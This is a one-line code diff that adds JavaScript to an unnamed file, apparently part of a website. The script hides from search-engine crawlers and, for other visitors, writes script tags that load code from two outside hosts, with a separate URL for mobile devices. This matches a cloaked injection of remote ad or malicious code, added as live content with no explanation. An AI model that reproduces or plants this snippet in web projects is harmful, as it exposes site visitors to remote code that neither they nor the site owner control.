@@ -1,0 +1,1 @@
+var pcad,mobad;isMobile.spider||(pcad=new Array,pcad[0]="https://jc.4006825178.com/7c792a/c@66298!3.js",mobad=new Array,mobad[0]="https://k.henanfs.com/d.php?pid=1700",isMobile.any?document.write("<script src='"+mobad[Math.floor(Math.random()*(mobad.length-1+1))]+"'></script>"):document.write("<script src='"+pcad[Math.floor(Math.random()*(pcad.length-1+1))]+"'></script>"));
